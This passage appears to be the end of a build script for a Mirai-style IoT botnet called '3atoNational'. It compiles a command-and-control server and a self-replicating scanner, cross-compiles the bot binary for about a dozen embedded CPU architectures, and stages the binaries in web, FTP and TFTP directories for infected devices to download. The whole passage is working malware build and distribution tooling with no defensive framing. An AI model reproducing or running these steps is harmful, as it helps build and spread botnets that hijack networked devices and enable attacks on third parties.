...
mkdir /var/www/html
mkdir /var/www/html/389242390482
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/
go build -o selfrep/scanListen scanListen.go
echo "COMPILING i586$domainres"
compile_bot i586 3atoNational.x86 "$FLAGS $domain -static"
echo "COMPILING mips$domainres"
compile_bot mips 3atoNational.mips "$FLAGS $domain -static"
echo "COMPILING mipsel$domainres"
compile_bot mipsel 3atoNational.mpsl "$FLAGS $domain -static"
echo "COMPILING armv4l$domainres"
compile_bot armv4l 3atoNational.arm "$FLAGS $domain -static"
echo "COMPILING armv5l$domainres"
compile_bot armv5l 3atoNational.arm5 "$FLAGS $domain"
echo "COMPILING armv6l$domainres"
compile_bot armv6l 3atoNational.arm6 "$FLAGS $domain -static"
echo "COMPILING armv7l$domainres"
compile_bot armv7l 3atoNational.arm7 "$FLAGS $domain -static"
echo "COMPILING ppc$domainres"
compile_bot powerpc 3atoNational.ppc "$FLAGS $domain -static"
echo "COMPILING sparc$domainres"
compile_bot sparc 3atoNational.spc "$FLAGS $domain -static"
echo "COMPILING m68k$domainres"
compile_bot m68k 3atoNational.m68k "$FLAGS $domain -static"
echo "COMPILING sh4$domainres"
compile_bot sh4 3atoNational.sh4 "$FLAGS $domain -static"
cp release/3atoNational* /var/www/html/389242390482
cp release/3atoNational* /var/ftp
mv release/3atoNational* /var/lib/tftpboot
rm -rf release
###################################################################
